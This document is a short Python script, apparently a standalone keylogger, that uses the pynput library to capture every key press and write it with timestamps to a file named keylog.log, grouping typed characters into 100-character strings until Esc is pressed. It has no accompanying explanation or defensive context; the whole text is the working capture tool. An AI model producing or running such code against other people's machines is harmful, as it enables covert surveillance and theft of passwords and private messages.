from pynput import keyboard
import logging

log_file = "keylog.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')

key_press_data = ""

def on_press(key):
    try: 
        global key_press_data
        key_press_data += key.char
        if(len(key_press_data) == 100):
            logging.info('String: {0}'.format(key_press_data))
            key_press_data=""
        logging.info('Key {0} pressed'.format(key.char))
    except:
        logging.info('special key {0} pressed'.format(key))
        
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

